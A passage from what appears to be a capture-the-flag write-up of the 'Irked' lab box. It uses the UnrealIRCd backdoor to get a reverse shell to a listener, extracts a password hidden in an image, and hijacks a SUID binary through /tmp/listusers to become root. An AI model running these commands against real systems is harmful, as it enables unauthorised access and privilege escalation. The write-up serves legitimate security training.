The presence of UnrealIRCd is the most interesting entry point here: it's a service historically plagued by a well-known backdoor.

## Exploitation

A quick search confirms the suspicion:

```bash
searchsploit UnrealIRCd
```

```
------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                  |  Path
------------------------------------------------------------------------------------------------ ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                    | linux/remote/16922.rb
```

Instead of going through Metasploit, a standalone PoC available on GitHub is used: [UnrealIRCD-3.2.8.1-RCE](https://github.com/kevinpdicks/UnrealIRCD-3.2.8.1-RCE/blob/main/exploit.py).

First, set up a listener:

```bash
nc -lvnp 9001
```

Then launch the exploit against port 6697, specifying the callback IP and port:

```bash
python exploit.py 10.129.73.12 6697 10.10.14.134 9001
```

The shell lands on the listener:

```
listening on [any] 9001 ...
connect to [10.10.14.134] from (UNKNOWN) [10.129.73.12] 60852
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

Foothold obtained as user `ircd`.

## Privilege Escalation

### From ircd to djmardov

Poking around the filesystem, an interesting hidden file turns up inside `djmardov`'s `Documents` folder:

```bash
ircd@irked:/home/djmardov/Documents$ ls -la
```

```
total 12
drwxr-xr-x  2 djmardov djmardov 4096 Sep  5  2022 .
drwxr-xr-x 18 djmardov djmardov 4096 Sep  5  2022 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
lrwxrwxrwx  1 root     root       23 Sep  5  2022 user.txt -> /home/djmardov/user.txt
```

The `.backup` file contains a fairly explicit hint:

```bash
ircd@irked:/home/djmardov/Documents$ cat .backup
```

```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

"Steg backup pw" suggests this string is the **passphrase for a steganographed file**, not a password to log in with directly. Going back to the target's main web page, there's an image (`irked.jpg`) — the perfect candidate for a steganographic extraction.

Using `stegseek` (with the passphrase just found), the hidden content is extracted:

```bash
stegseek --crack irked.jpg wordlist.txt
```

```
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "UPupDOWNdownLRlrBAbaSSss"
[i] Original filename: "pass.txt".
[i] Extracting to "irked.jpg.out"
```

The extracted file finally contains a valid password:

```bash
cat irked.jpg.out
```

```
Kab6h+m+bbp2J:HG
```

With this credential, it's possible to pivot to the `djmardov` user:

```bash
ircd@irked:/home$ su - djmardov
Password:
```

```
djmardov@irked:~$ id
uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

Looking for the usual SUID binaries on the system:

```bash

```


Among the usual system binaries, `/usr/bin/viewuser` immediately stands out: it's not part of a standard Debian install, making it the most likely candidate for privesc.

Running it gives a better idea of what it does:

```bash
djmardov@irked:~$ /usr/bin/viewuser
```

```
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2026-09-23 03:23 (:0)
sh: 1: /tmp/listusers: not found
```

The final line of output is the key to everything: the binary, running with SUID permissions (presumably root's), tries to invoke `/tmp/listusers` using an **absolute path** in a world-writable directory. All that's needed is to drop an executable with that name in `/tmp` to have it run in its place, inheriting its privileges.

```bash
echo '#!/bin/bash' > /tmp/listusers
echo '/bin/bash -p' >> /tmp/listusers
chmod +x /tmp/listusers
```

Re-running the SUID binary:

```bash
djmardov@irked:~$ /usr/bin/viewuser
```

```
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2026-09-23 03:23 (:0)
root@irked:~# whoami
root
```
